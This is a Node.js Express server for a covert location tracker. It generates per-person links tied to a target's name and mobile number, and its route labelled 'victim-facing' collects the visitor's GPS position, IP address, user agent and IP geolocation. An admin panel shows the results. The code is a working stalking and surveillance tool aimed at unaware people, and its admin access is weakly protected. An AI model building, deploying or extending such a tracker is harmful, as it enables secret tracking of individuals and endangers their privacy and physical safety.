const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || '';
const DB_FILE = path.join(__dirname, 'db.json');

app.set('trust proxy', true);
app.use(express.json());

// persistence: { targets: [ { id, name, mobile, createdAt, hits: [] } ] }
let db = { targets: [] };
if (fs.existsSync(DB_FILE)) {
  try { db = JSON.parse(fs.readFileSync(DB_FILE, 'utf8')); } catch (_) {}
  if (!Array.isArray(db.targets)) db.targets = [];
}
const save = () => fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));

async function geoip(ip) {
  try {
    const r = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,query`
    );
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch (_) { return null; }
}

const clientIp = (req) =>
  (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

const authed = (req, res, next) => {
  if (ADMIN_TOKEN && req.query.token !== ADMIN_TOKEN) return res.status(401).json({ error: 'unauthorized' });
  next();
};

// ---- create a tracking link for a target (name + mobile) ----
app.post('/api/targets', (req, res) => {
  const { name, mobile } = req.body || {};
  if (!name || !mobile)
    return res.status(400).json({ error: 'name and mobile are required' });
  const id = crypto.randomBytes(6).toString('hex'); // 12-char unguessable id
  const target = {
    id,
    name: String(name).trim(),
    mobile: String(mobile).trim(),
    createdAt: new Date().toISOString(),
    hits: []
  };
  db.targets.push(target);
  save();
  res.json({ target, link: `${req.protocol}://${req.get('host')}/t/${id}` });
});

app.get('/api/targets', authed, (req, res) => res.json(db.targets));

app.delete('/api/targets/:id', authed, (req, res) => {
  db.targets = db.targets.filter(t => t.id !== req.params.id);
  save();
  res.json({ ok: true });
});

// ---- the victim-facing page, with the target id injected ----
app.get('/t/:id', (req, res) => {
  const target = db.targets.find(t => t.id === req.params.id);
  if (!target) return res.status(404).send('Not found');
  let html = fs.readFileSync(path.join(__dirname, 'public', 'track.html'), 'utf8');
  html = html.replace(/__TARGET_ID__/g, target.id);
  res.type('html').send(html);
});

// ---- hit endpoint ----
app.post('/api/track', async (req, res) => {
  const { targetId, lat, lng, accuracy, source } = req.body || {};
  const target = db.targets.find(t => t.id === targetId);
  if (!target) return res.status(404).json({ error: 'unknown target' });

  const ip = clientIp(req);
  const hit = {
    id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
    ts: new Date().toISOString(),
    ip,
    ua: req.headers['user-agent'] || '',
    gps: lat && lng ? { lat: +lat, lng: +lng, accuracy: accuracy || null } : null,
    geoip: await geoip(ip),
    source: source || 'ip'
  };
  target.hits.push(hit);
  save();
  res.json({ ok: true });
});

// ---- hits for all targets, or one (filter) ----
app.get('/api/locations', authed, (req, res) => {
  const { target } = req.query;
  let targets = db.targets;
  if (target) targets = targets.filter(t => t.id === target);
  const hits = targets.flatMap(t =>
    t.hits.map(h => ({ ...h, target: { id: t.id, name: t.name, mobile: t.mobile } }))
  );
  res.json(hits.reverse()); // newest first
});

app.get('/admin', authed, (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
app.get('/', (req, res) => res.redirect('/admin'));

app.listen(PORT, () => {
  console.log(`[+] Admin panel:  http://localhost:${PORT}/admin${ADMIN_TOKEN ? '?token=' + ADMIN_TOKEN : ''}`);
  console.log(`[+] Target links: http://localhost:${PORT}/t/<target-id>`);
});